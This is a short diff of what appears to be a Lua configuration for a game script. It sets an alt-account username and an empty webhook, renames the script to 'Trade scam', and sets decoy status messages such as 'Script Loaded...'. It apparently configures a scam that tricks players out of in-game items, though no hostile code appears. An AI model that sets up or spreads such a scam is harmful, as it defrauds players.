@@ -1,7 +1,7 @@
 Username = "comedor_ALT"
 WebHook = ""
 
-_G.CustomScriptName = "Coen"
+_G.CustomScriptName = "Trade scam"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
